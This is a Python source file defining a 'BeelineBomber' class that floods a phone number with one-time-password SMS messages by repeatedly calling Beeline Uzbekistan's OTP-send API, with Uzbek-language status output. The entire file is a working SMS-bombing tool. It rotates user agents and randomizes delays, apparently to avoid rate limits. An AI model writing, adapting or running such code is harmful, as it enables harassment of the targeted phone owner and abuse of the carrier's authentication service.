import requests

import time
import random

from .utils import random_user_agent
from .utils import FormattingOptions

fo = FormattingOptions()

class BeelineBomber:
    def __init__(self, session: requests.Session) -> None:
        self.sess = session
        self.main_url = "https://beeline.uz/restservices/api/a2/auth/998{}/otp/send"
        self.headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'User-Agent': random_user_agent(),
        }

    def start_bombing(self, phone: str, amount: int = 1):
        print(fo._(fo.BOLD, "\nBu bomber faqat beeline abonentlari uchun.\nTo'xtatish uchun: [Ctrl]+[C]"))
        
        for s in range(1, amount + 1):
            r = self.sess.get(
                url=self.main_url.format(phone),
                headers=self.headers
            )
            
            r = r.text if r.status_code == 200 else 'Error'
            r = 'Error' if 'OK' not in r else r

            f = {'format':fo.OKGREEN, 'text': 'Muvaffaqiyatli!'} \
                if 'Error' not in r and isinstance(r, str) \
                else {'format': fo.FAIL, 'text': 'Muvaffaqiyatsiz!'}
            print(f"{fo._(fo.BOLD, str(s)+'|')} {fo._(f['format'], f['text'])}")

            time.sleep(random.choice([1, 2, .7]))
        else:
            print(fo._(fo.BOLD, '\nTugadi :)\n'))
